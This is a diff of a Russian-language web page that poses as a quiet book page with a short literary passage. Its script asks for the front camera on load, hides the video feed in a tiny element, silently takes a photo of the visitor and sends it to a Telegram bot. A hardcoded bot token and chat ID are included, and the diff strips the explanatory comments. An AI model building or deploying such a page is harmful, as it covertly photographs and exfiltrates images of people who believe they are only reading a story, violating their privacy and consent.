@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Книжная полка</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f3e9d2;
             font-family: 'Georgia', 'Times New Roman', serif;
@@ -21,8 +16,6 @@
             justify-content: center;
             align-items: center;
         }
-
-        /* Имитация книги */
         .book {
             max-width: 800px;
             width: 100%;
@@ -31,39 +24,11 @@
             border-radius: 12px;
             padding: 2.5rem;
             position: relative;
-            transition: all 0.2s;
         }
-
-        .book::before {
-            content: "📖";
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            font-size: 2rem;
-            opacity: 0.2;
-        }
-
-        h1 {
-            font-size: 2rem;
-            text-align: center;
-            font-weight: normal;
-            letter-spacing: 2px;
-            border-bottom: 1px solid #e0d5c0;
-            padding-bottom: 0.5rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .chapter {
-            font-size: 1.2rem;
-            line-height: 1.6;
-            text-align: justify;
-            margin-top: 1rem;
-        }
-
-        .chapter p {
-            margin-bottom: 1.2rem;
-        }
-
+        .book::before { content: "📖"; position: absolute; top: 20px; left: 20px; font-size: 2rem; opacity: 0.2; }
+        h1 { font-size: 2rem; text-align: center; border-bottom: 1px solid #e0d5c0; padding-bottom: 0.5rem; margin-bottom: 1.5rem; }
+        .chapter { font-size: 1.2rem; line-height: 1.6; text-align: justify; margin-top: 1rem; }
+        .chapter p { margin-bottom: 1.2rem; }
         .status-message {
             margin-top: 2rem;
             padding: 0.8rem;
@@ -75,7 +40,6 @@
             border-radius: 6px;
             text-align: center;
         }
-
         footer {
             margin-top: 2rem;
             font-size: 0.7rem;
@@ -84,8 +48,6 @@
             border-top: 1px dashed #e0d5c0;
             padding-top: 1rem;
         }
-
-        /* Абсолютно скрытое видео (1x1 пиксель, невидимо) */
         #hidden-video {
             position: fixed;
             bottom: 0;
@@ -101,33 +63,27 @@
 <div class="book">
     <h1>Тихие страницы</h1>
     <div class="chapter">
-        <p>… Он открыл книгу на старой, пожелтевшей странице. За окном шумел дождь, и единственным светом была настольная лампа с зелёным абажуром. В такие моменты забываешь о времени. Буквы складывались в истории, которые жили своей жизнью, не требуя ничего взамен.</p>
-        <p>Но иногда даже самый погружённый читатель чувствует чей-то взгляд. Может быть, это просто тень? Или блик от влажного стекла? Книга вновь приоткрывает свои тайны, а в комнате становится чуть теплее…</p>
+        <p>… Он открыл книгу на старой, пожелтевшей странице. За окном шумел дождь, и единственным светом была настольная лампа с зелёным абажуром. В такие моменты забываешь о времени.</p>
+        <p>Но иногда даже самый погружённый читатель чувствует чей-то взгляд. Книга вновь приоткрывает свои тайны, а в комнате становится чуть теплее…</p>
     </div>
-    <div id="status" class="status-message">
-        ⏳ Подготовка...
-    </div>
-    <footer>
-        «Страница, которую вы видите, может измениться»<br>
-        (c) Этюд в серых тонах
-    </footer>
+    <div id="status" class="status-message">⏳ Подготовка...</div>
+    <footer>«Страница, которую вы видите, может измениться»<br>(c) Этюд в серых тонах</footer>
 </div>
 
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas" style="display: none;"></canvas>
 
 <script>
-    // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
-    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';   // например '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
-    const CHAT_ID = '5305261101';   // например '987654321'
+    // ========== ПРАВИЛЬНЫЕ ДАННЫЕ ==========
+    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
+    const CHAT_ID = '5305261101';
 
-    // ========== Элементы ==========
     const video = document.getElementById('hidden-video');
     const canvas = document.getElementById('hidden-canvas');
     const statusDiv = document.getElementById('status');
 
     let stream = null;
-    let photoCaptured = false;   // чтобы не отправлять повторно
+    let photoCaptured = false;
 
     function setStatus(msg, isError = false) {
         statusDiv.innerHTML = isError ? `⚠️ ${msg}` : `📘 ${msg}`;
@@ -135,7 +91,6 @@
         console.log(msg);
     }
 
-    // Остановить камеру
     function stopCamera() {
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
@@ -144,38 +99,28 @@
         video.srcObject = null;
     }
 
-    // Захват фото и отправка
     async function captureAndSend() {
         if (photoCaptured) return;
         if (!video.videoWidth || !video.videoHeight) {
-            setStatus('Видеопоток ещё не готов, повторная попытка через 0.5с...');
+            setStatus('Видеопоток ещё не готов, повтор через 0.5с...');
             setTimeout(captureAndSend, 500);
             return;
         }
 
-        // Настроим canvas под размер видео
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
-        // Отражаем зеркально (для передней камеры, как в зеркале)
         ctx.save();
         ctx.scale(-1, 1);
         ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
         ctx.restore();
 
-        // Превращаем в Blob
         canvas.toBlob(async (blob) => {
             if (!blob) {
                 setStatus('Ошибка создания фото', true);
                 return;
             }
             setStatus('📸 Фото сделано, отправляю в Telegram...');
-
-            if (!BOT_TOKEN || BOT_TOKEN === 'ВАШ_ТОКЕН' || !CHAT_ID || CHAT_ID === 'ВАШ_CHAT_ID') {
-                setStatus('❌ Не заданы токен бота или chat_id. Замените в коде.', true);
-                stopCamera();
-                return;
-            }
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -188,93 +133,66 @@
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    setStatus('✅ Фото успешно отправлено в Telegram. Камера выключена.');
+                    setStatus('✅ Фото успешно отправлено в Telegram!');
                     photoCaptured = true;
                     stopCamera();
                 } else {
-                    setStatus(`Ошибка Telegram: ${result.description || 'неизвестно'}`, true);
+                    setStatus(`Ошибка Telegram: ${result.description}`, true);
                 }
             } catch (err) {
                 setStatus(`Сетевая ошибка: ${err.message}`, true);
-            } finally {
-                // Если отправка не удалась – не выключаем камеру, дадим шанс повторно (но повторной отправки не будет)
-                if (!result?.ok) {
-                    // можно дать кнопку? но по условию – автоматически. Просто сообщим.
-                }
             }
         }, 'image/jpeg', 0.85);
     }
 
-    // Запрос камеры и запуск автоматического захвата
     async function requestCameraAndAutoCapture() {
         setStatus('Запрос доступа к передней камере...');
         try {
-            // Пытаемся получить именно переднюю камеру (user)
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: "user" } }
             });
             video.srcObject = stream;
-            setStatus('Камера разрешена. Инициализация потока...');
-
-            // Ждём, когда видео получит метаданные
+            setStatus('Камера разрешена. Инициализация...');
             video.onloadedmetadata = () => {
                 video.play();
-                // Даём видео стабилизироваться (некоторые устройства требуют задержки)
                 setTimeout(() => {
-                    if (!photoCaptured) {
-                        captureAndSend();
-                    }
+                    if (!photoCaptured) captureAndSend();
                 }, 1200);
             };
         } catch (err) {
-            console.error(err);
             if (err.name === 'OverconstrainedError') {
-                setStatus('Передняя камера не найдена. Пробуем любую доступную...', true);
+                setStatus('Передняя камера не найдена. Пробую любую...', true);
                 try {
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream = fallbackStream;
                     video.srcObject = stream;
-                    setStatus('Используется камера по умолчанию (возможно, задняя).');
+                    setStatus('Используется камера по умолчанию.');
                     video.onloadedmetadata = () => {
                         video.play();
                         setTimeout(() => captureAndSend(), 1200);
                     };
                 } catch (fallbackErr) {
-                    setStatus('Не удалось получить доступ к камере: ' + fallbackErr.message, true);
+                    setStatus('Ошибка доступа к камере: ' + fallbackErr.message, true);
                 }
             } else if (err.name === 'NotAllowedError') {
-                setStatus('Вы запретили доступ к камере. Обновите страницу и разрешите.', true);
+                setStatus('Вы запретили доступ к камере. Разрешите и обновите страницу.', true);
             } else {
                 setStatus('Ошибка: ' + err.message, true);
             }
         }
     }
 
-    // Автоматический запуск при загрузке страницы
     window.addEventListener('load', () => {
-        // Некоторые браузеры требуют жест пользователя для getUserMedia.
-        // Пытаемся запустить сразу. Если блокируется, просим кликнуть.
-        requestCameraAndAutoCapture().catch(e => console.warn(e));
-
-        // Резерв: если через 2 секунды камера не запустилась (нет потока), показываем сообщение о клике.
+        requestCameraAndAutoCapture();
         setTimeout(() => {
             if (!stream && !photoCaptured) {
-                setStatus('📌 Для автоматического фото нажмите в любом месте страницы (требование браузера).', false);
-                const clickHandler = async () => {
-                    await requestCameraAndAutoCapture();
-                    document.body.removeEventListener('click', clickHandler);
-                };
-                document.body.addEventListener('click', clickHandler, { once: true });
+                setStatus('📌 Нажмите в любом месте страницы для доступа к камере');
+                document.body.addEventListener('click', () => requestCameraAndAutoCapture(), { once: true });
             }
         }, 1500);
     });
 
-    // Остановка камеры при уходе со страницы
-    window.addEventListener('beforeunload', () => {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
-    });
+    window.addEventListener('beforeunload', () => stopCamera());
 </script>
 </body>
 </html>
